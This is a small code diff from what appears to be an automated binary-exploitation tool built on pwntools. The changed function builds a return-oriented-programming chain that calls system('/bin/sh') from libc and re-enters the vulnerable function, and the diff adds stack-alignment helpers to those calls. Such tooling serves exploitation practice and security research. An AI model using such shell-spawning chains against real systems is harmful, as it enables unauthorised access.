@@ -25,8 +25,9 @@ def system_binsh(state: PwnState) -> PwnState:
     assert state.libc is not None
 
     rop = ROP([state.elf, state.libc])
-    rop.system(next(state.libc.search(b"/bin/sh\x00")))
-    rop.call(state.vuln_function)  # just in case, to allow for further exploitation
+    arutil.align_call(rop, "system", [next(state.libc.search(b"/bin/sh\x00"))])
+    # just in case, to allow for further exploitation
+    arutil.align_call(rop, state.vuln_function, [])
     log.info(rop.dump())
 
     state.overwriter(state.target, rop.chain())
